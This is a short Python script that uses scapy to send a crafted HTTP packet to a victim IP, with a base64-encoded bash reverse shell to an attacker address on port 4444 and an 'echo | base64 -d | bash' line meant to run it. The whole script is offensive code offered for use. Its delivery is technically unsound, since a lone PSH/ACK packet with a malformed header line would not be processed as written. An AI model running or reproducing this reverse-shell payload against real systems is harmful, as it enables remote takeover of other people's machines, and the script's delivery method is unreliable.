from scapy.all import *
import base64

# Target information
victim_ip = "192.168.1.184" 
attacker_ip = "192.168.1.215" 
attacker_port = 4444 

reverse_shell_cmd = f"/bin/bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"
encoded_payload = base64.b64encode(reverse_shell_cmd.encode()).decode()


payload = f"GET / HTTP/1.1\r\nHost: {victim_ip}\r\n"
payload += f"User-Agent: Mozilla/5.0\r\n"
payload += f"Accept: */*\r\n"
# Injecting base64-encoded reverse shell command
payload += f"\r\nContent: echo {encoded_payload} | base64 -d | bash\r\n\r\n"

packet = IP(dst=victim_ip) / TCP(dport=80, sport=RandShort(), flags="PA") / Raw(load=payload)

# Send the packet
send(packet)
print(f"Obfuscated (Base64) malicious packet sent to {victim_ip} on port 80")
